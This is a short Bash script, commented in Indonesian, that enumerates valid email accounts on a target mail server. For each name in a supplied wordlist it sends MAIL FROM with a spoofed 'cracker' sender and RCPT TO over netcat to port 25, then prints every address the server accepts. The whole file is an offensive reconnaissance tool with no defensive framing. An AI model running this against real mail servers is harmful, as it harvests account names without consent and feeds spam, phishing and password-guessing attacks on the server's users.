#!/bin/bash
# ini script untuk enumerasi SMTP service
# guna mendapatkan dafar pengguna email yang valid
TARGET=$1
if [ -z "$TARGET" ];
then
	echo "Gagal: Gunakan $0 <ip/hostname target> <file-userlist>"
	exit 1
fi
DICTIONARY=$2
if [ -z "$DICTIONARY" ];
then
	echo "Gagal: Gunakan $0 <ip/hostname target> <file-userlist>"
	exit 1
fi

for data in `cat $DICTIONARY`; 
do 
	 hasil=`echo "MAIL FROM:cracker@prikitiw.net\nRCPT TO:$data\nquit" | nc $TARGET 25 | tail -2 | head -1| grep ^25 | awk '{ print $3 }'`
         if [ -n "$hasil" ];
	 then
             echo $data
          fi
done




